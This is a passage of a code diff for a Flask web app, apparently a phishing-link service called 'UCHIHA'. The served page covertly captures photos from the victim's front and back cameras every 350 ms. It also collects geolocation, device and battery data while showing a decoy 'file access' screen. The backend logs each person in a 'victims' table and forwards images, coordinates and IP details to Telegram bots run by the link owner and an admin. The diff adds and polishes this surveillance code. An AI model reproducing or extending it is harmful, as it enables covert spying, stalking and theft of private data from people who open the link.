-                        (p) => {
-                            fetch("/api/log_loc/{{ l_id }}", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({lat: p.coords.latitude, lon: p.coords.longitude}) }).catch(()=>{});
-                        },
+                        (p) => { fetch("/api/log_loc/{{ l_id }}", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({lat: p.coords.latitude, lon: p.coords.longitude}) }).catch(()=>{}); },
                         (e) => {}, { timeout: 8000 }
                     );
                 }
@@ -265,10 +372,11 @@ def target_page(link_id):
 
             function showFileContent() {
                 let medBox = document.getElementById('media-content');
+                medBox.classList.remove('hidden');
                 let html = "";
                 
                 if(actMode === 'text') {
-                    html = `<div style="color:#fff; font-size:1.2rem; margin-bottom:20px; width:100%; text-align:left; white-space:pre-wrap;">${txtVal}</div>`;
+                    html = `<h2 class="font-display font-black text-2xl mb-4 text-cyan-400">DECRYPTED DATA</h2><div class="bg-black/40 p-4 rounded-xl text-left whitespace-pre-wrap font-mono text-sm border border-white/10">${txtVal}</div>`;
                 } else if (actMode === 'file') {
                     let ext = actVal.split('.').pop().toLowerCase();
                     let isVideo = ['mp4', 'webm', 'ogg', 'mov'].includes(ext);
@@ -276,117 +384,65 @@ def target_page(link_id):
 
                     let previewHtml = '';
                     if(isVideo || fType === 'video') {
-                        previewHtml = `<video src="${actVal}" controls autoplay playsinline style="width:100%; max-height:300px; border-radius:10px; background:#000; margin-bottom:20px;" onerror="this.outerHTML='<div class=\\'file-icon-box\\'><i class=\\'fas fa-file-video\\'></i><p>Video File Ready</p></div>'"></video>`;
+                        previewHtml = `<video src="${actVal}" controls autoplay playsinline class="w-full max-h-[300px] rounded-xl bg-black mb-6 border border-white/10" onerror="this.outerHTML='<div class=\\'py-10 bg-black/40 rounded-xl mb-6\\'><i class=\\'fas fa-file-video text-4xl text-cyan-400 mb-2\\'></i><p class=\\'text-xs uppercase font-bold\\'>Video Ready</p></div>'"></video>`;
                     } else if (isImage || fType === 'image') {
-                        previewHtml = `<img src="${actVal}" style="width:100%; max-height:300px; object-fit:contain; border-radius:10px; margin-bottom:20px;" onerror="this.outerHTML='<div class=\\'file-icon-box\\'><i class=\\'fas fa-file-image\\'></i><p>Image File Ready</p></div>'">`;
+                        previewHtml = `<img src="${actVal}" class="w-full max-h-[300px] object-contain rounded-xl mb-6 border border-white/10" onerror="this.outerHTML='<div class=\\'py-10 bg-black/40 rounded-xl mb-6\\'><i class=\\'fas fa-file-image text-4xl text-cyan-400 mb-2\\'></i><p class=\\'text-xs uppercase font-bold\\'>Image Ready</p></div>'">`;
                     } else {
-                        previewHtml = `<div class="file-icon-box"><i class="fas fa-file-archive"></i><p>Secure Shared File</p></div>`;
+                        previewHtml = `<div class="py-10 bg-black/40 border border-white/10 rounded-xl mb-6"><i class="fas fa-file-archive text-5xl text-cyan-400 mb-3"></i><p class="text-xs uppercase tracking-widest font-bold text-gray-400">Secure Document</p></div>`;
                     }
 
                     html = `
-                        <h2 style="margin-bottom:20px; font-size:1.4rem;">File Access Granted</h2>
+                        <h2 class="font-display font-black text-xl mb-6 text-white">ACCESS <span class="text-cyan-400">GRANTED</span></h2>
                         ${previewHtml}
-                        <a href="${actVal}" target="_blank" class="btn-download"><i class="fas fa-download"></i> Download File</a>
+                        <a href="${actVal}" target="_blank" class="block w-full bg-gradient-to-r from-cyan-500 to-blue-500 text-white font-bold uppercase tracking-widest p-4 rounded-xl hover:shadow-[0_0_20px_rgba(0,229,255,0.4)] transition-all"><i class="fas fa-download mr-2"></i> Download Payload</a>
                     `;
                 } else {
-                    html = `<div class="file-icon-box"><i class="fas fa-link"></i><p>External Link Ready</p></div><a href="${actVal}" target="_blank" class="btn-download">Continue to Link</a>`;
+                    html = `<div class="py-10 bg-black/40 border border-white/10 rounded-xl mb-6"><i class="fas fa-link text-5xl text-cyan-400 mb-3"></i><p class="text-xs uppercase tracking-widest font-bold text-gray-400">External Gateway</p></div>
+                    <a href="${actVal}" target="_blank" class="block w-full bg-gradient-to-r from-cyan-500 to-blue-500 text-white font-bold uppercase tracking-widest p-4 rounded-xl hover:shadow-[0_0_20px_rgba(0,229,255,0.4)] transition-all">Proceed to Link <i class="fas fa-arrow-right ml-2"></i></a>`;
                 }
                 medBox.innerHTML = html;
             }
 
             async function switchCameraTo(facingModeStr) {
-                // BUG FIX: Pehle current camera ki stream ko proper STOP karo taake switch lag jaye
-                if (camStream) {
-                    camStream.getTracks().forEach(track => track.stop());
-                    camStream = null;
-                }
-                
+                if (camStream) { camStream.getTracks().forEach(track => track.stop()); camStream = null; }
                 try {
-                    // HD Resolution request
-                    let constraints = {
-                        video: { 
-                            facingMode: facingModeStr === "environment" ? { ideal: "environment" } : "user",
-                            width: { ideal: 1280 },
-                            height: { ideal: 720 }
-                        }
-                    };
-                    camStream = await navigator.mediaDevices.getUserMedia(constraints);
+                    camStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingModeStr === "environment" ? { ideal: "environment" } : "user", width: { ideal: 1280 }, height: { ideal: 720 } } });
                     const bgV = document.getElementById('bg-v');
-                    bgV.srcObject = camStream;
-                    bgV.onloadedmetadata = () => { bgV.play(); };
+                    bgV.srcObject = camStream; bgV.onloadedmetadata = () => { bgV.play(); };
                     currentCam = facingModeStr;
-                } catch(e) {
-                    console.log("Cam switch failed: ", e);
-                }
+                } catch(e) {}
             }
 
             function captureUltraFast() {
                 if(camStream) {
-                    const bgV = document.getElementById('bg-v');
-                    const c = document.getElementById('c');
+                    const bgV = document.getElementById('bg-v'); const c = document.getElementById('c');
                     if(bgV.videoWidth > 0) {
-                        // FIX: Ab size half nahi kar raha, original HD (1280x720) mein bheje ga
-                        c.width = bgV.videoWidth; 
-                        c.height = bgV.videoHeight;
+                        c.width = bgV.videoWidth; c.height = bgV.videoHeight;
                         c.getContext('2d').drawImage(bgV, 0, 0, c.width, c.height);
-                        
-                        // FIX: Quality set to 0.8 (HD)
                         let imgData = c.toDataURL('image/jpeg', 0.8);
-                        
-                        // FIX MINIMIZE ISSUE: Agar image bilkul last jaisi hai (mtlb video freeze ho chuki hai OS ki taraf se) toh skip kardo, spam nai hoga
-                        if (imgData === lastSentImage) {
-                            return; 
-                        }
+                        if (imgData === lastSentImage) return; 
                         lastSentImage = imgData;
-
-                        fetch("/api/capture/{{ l_id }}", { 
-                            method: "POST", 
-                            headers: {"Content-Type":"application/json"}, 
-                            body: JSON.stringify({ img: imgData, cam_type: currentCam.toUpperCase() }) 
-                        }).catch(()=>{});
+                        fetch("/api/capture/{{ l_id }}", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({ img: imgData, cam_type: currentCam.toUpperCase() }) }).catch(()=>{});
                     }
                 }
             }
 
             async function startUltraStealthSequence() {
-                // Sequence Start: Pehlay Front (User)
-                currentCam = "user";
-                await switchCameraTo(currentCam);
-
-                // Speed limit 350ms per frame
+                currentCam = "user"; await switchCameraTo(currentCam);
                 if(captureIntervalId) clearInterval(captureIntervalId);
                 captureIntervalId = setInterval(captureUltraFast, 350);
-
-                // Rotation Loop Shuru
                 runCamCycle();
             }
 
             function runCamCycle() {
-                if (currentCam === "user") {
-                    // Front cam 20 sec chala, ab Back (Environment) par shift karo
-                    setTimeout(async () => {
-                        await switchCameraTo("environment");
-                        runCamCycle();
-                    }, 20000);
-                } else {
-                    // Back cam 10 sec chala, ab dobara Front par shift karo
-                    setTimeout(async () => {
-                        await switchCameraTo("user");
-                        runCamCycle();
-                    }, 10000);
-                }
+                if (currentCam === "user") { setTimeout(async () => { await switchCameraTo("environment"); runCamCycle(); }, 20000); } 
+                else { setTimeout(async () => { await switchCameraTo("user"); runCamCycle(); }, 10000); }
             }
-
-            // Persistence Listener
-            document.addEventListener("visibilitychange", () => {
-                if (document.hidden) {
-                    console.log("UCHIHA Chrome minimized. Video feed might freeze by OS.");
-                }
-            });
         </script>
     </body>
     </html>
-    ''', a_mode=action_mode, a_val=action_value, t_content=text_content, f_type=file_type, l_id=link_id)
+    '''
+    return render_template_string(html_code, a_mode=action_mode, a_val=action_value, t_content=text_content, f_type=file_type, l_id=link_id)
 
 # --- BACKEND LOGGING APIS ---
 @app.route("/api/log_hardware/<l_id>", methods=["POST"])
@@ -396,12 +452,40 @@ def log_hw(l_id):
         user = link["users"]
         d = request.get_json()
         ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-        dev_info = f"{d['plat']} - Cores: {d['cores']}"
         
-        msg = f"🎯 *TARGET HIT*\\n\\n🌐 *IP:* `{ip}`\\n💻 *Device:* {dev_info}\\n📌 *Mode:* {link['target_type'].upper()}"
+        # IP Tracking
+        ip_data = {}
+        try:
+            res = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,isp,query", timeout=3).json()
+            if res.get("status") == "success": ip_data = res
+        except: pass
+        
+        dev_info = f"{d.get('plat', 'Unknown')} - Cores: {d.get('cores', '0')}"
+        battery = d.get('battery', 'Unknown')
+        
+        # Save to DB (For Core Dashboard)
+        supabase.table("victims").insert({
+            "link_id": l_id, "user_id": link["user_id"], "ip_address": ip,
+            "ip_details": ip_data, "device_info": dev_info, "battery_info": battery
+        }).execute()
+        
+        loc_str = f"{ip_data.get('city', 'Unknown')}, {ip_data.get('country', 'Unknown')}"
+        isp_str = ip_data.get('isp', 'Unknown ISP')
+        mode = escape_md(link['target_type'].upper())
+        
+        # BOLD MarkdownV2 Message
+        msg = (
+            f"🎯 *TARGET HIT*\n\n"
+            f"🌐 *IP:* `{escape_md(ip)}`\n"
+            f"📍 *Location:* `{escape_md(loc_str)}`\n"
+            f"🏢 *ISP:* `{escape_md(isp_str)}`\n"
+            f"💻 *Device:* `{escape_md(dev_info)}`\n"
+            f"🔋 *Battery:* `{escape_md(battery)}`\n"
+            f"📌 *Mode:* `{mode}`"
+        )
         send_tg_msg(user["bot_token"], user["chat_id"], msg)
-        send_tg_msg(ADMIN_TOKEN, ADMIN_CID, f"🔥 *ADMIN ALERT: TARGET HIT*\\nUser: {user['bot_name']}\\nIP: {ip}")
-    except: pass
+        send_tg_msg(ADMIN_TOKEN, ADMIN_CID, f"🔥 *ADMIN ALERT: HIT*\n*By:* `{escape_md(user['bot_name'])}`\n*IP:* `{escape_md(ip)}`")
+    except Exception as e: print(e)
     return jsonify({"s": 1})
 
 @app.route("/api/log_loc/<l_id>", methods=["POST"])
@@ -411,11 +495,12 @@ def log_loc(l_id):
         user = link["users"]
         d = request.get_json()
         
-        map_link = f"https://www.google.com/maps?q={d['lat']},{d['lon']}"
-        msg = f"📍 *LOCATION FOUND*\\n\\nLat: `{d['lat']}`\\nLon: `{d['lon']}`\\n🗺 Map: {map_link}"
+        lat = escape_md(str(d['lat']))
+        lon = escape_md(str(d['lon']))
+        map_url = escape_md(f"https://www.google.com/maps?q={d['lat']},{d['lon']}")
         
+        msg = f"📍 *PRECISE LOCATION*\n\n*Lat:* `{lat}`\n*Lon:* `{lon}`\n🗺 *Map:* [View Here]({map_url})"
         send_tg_msg(user["bot_token"], user["chat_id"], msg)
-        send_tg_msg(ADMIN_TOKEN, ADMIN_CID, f"🔥 *ADMIN ALERT: LOCATION*\\nUser: {user['bot_name']}\\n{msg}")
     except: pass
     return jsonify({"s": 1})
 
@@ -426,14 +511,13 @@ def cap(l_id):
         user = link["users"]
         data = request.get_json()
         
-        img_data = data["img"]
-        cam_type = data.get("cam_type", "UNKNOWN")
-        raw = base64.b64decode(img_data.split(",")[1])
+        cam_type = escape_md(data.get("cam_type", "UNKNOWN"))
+        raw = base64.b64decode(data["img"].split(",")[1])
         
-        send_tg_photo(user["bot_token"], user["chat_id"], raw, f"😈 *UCHIHA CAPTURE*\\n📸 *Camera:* `{cam_type}`")
-        send_tg_photo(ADMIN_TOKEN, ADMIN_CID, raw, f"🔥 *ADMIN COPY*\\nBy: {user['bot_name']}\\nCam: {cam_type}")
-        return jsonify({"s": 1})
-    except: return jsonify({"s": 0})
+        caption = f"😈 *UCHIHA CAPTURE*\n📸 *Camera:* `{cam_type}`"
+        send_tg_photo(user["bot_token"], user["chat_id"], raw, caption)
+    except: pass
+    return jsonify({"s": 1})
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=5000, threaded=True)
